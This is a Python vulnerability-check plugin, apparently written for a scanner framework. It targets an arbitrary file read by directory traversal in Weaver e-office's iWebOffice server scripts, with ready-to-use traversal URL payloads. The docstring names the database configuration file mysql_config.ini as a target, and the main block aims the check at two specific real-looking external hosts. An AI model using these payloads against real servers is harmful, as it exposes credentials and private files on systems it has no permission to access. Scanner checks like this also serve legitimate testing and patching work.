#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 泛微e-office两处任意文件读取
author: yichin
refer:
    http://www.wooyun.org/bugs/wooyun-2010-0125638
description:
    iweboffice/officeserver.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../mysql_config.ini
    iWebOffice/OfficeServer2.php
    好像不能跨盘读取？求大牛指点
'''

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):
    payloads = [
        arg + 'iweboffice/officeserver.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../readme.txt',
        arg + 'iWebOffice/OfficeServer2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../readme.txt'
    ]
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        if (code==200) and ('86-021-68869298' in res):
            security_hole('Arbitrarily file download: ' + payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://eoffice.sccm.cn/')[1])
    audit(assign('weaver_oa', 'http://61.163.107.26:8082/')[1])